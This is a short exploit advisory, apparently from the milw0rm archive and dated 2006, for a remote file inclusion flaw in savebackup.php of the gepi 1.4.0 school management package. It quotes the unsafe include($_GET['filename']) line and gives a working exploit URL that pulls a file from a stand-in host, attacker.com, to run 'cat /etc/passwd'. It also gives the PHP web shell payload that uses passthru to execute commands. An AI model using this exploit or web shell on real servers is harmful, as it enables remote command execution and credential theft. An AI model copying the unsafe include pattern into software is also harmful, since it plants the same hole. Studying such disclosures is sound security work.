@@ -1,0 +1,19 @@
+Package:- gepi 1.4.0
+http://adullact.net/frs/download.php/992/gepi-1.4.0.tar.gz
+
+impact:- highly critical ..System Access..
+vulnerable code:-
+      include($_GET['filename']);
+in gepi/gestion/savebackup.php
+
+Exploit:-
+http://localhost/gepi/gestion/savebackup.php?filename=http://attacker.com/test.txt&cmd=cat
+/etc/passwd
+
+in test.txt
+<? passthru("$_GET[cmd]");?>
+
+Credits:-
+$um$id
+
+# milw0rm.com [2006-10-31]
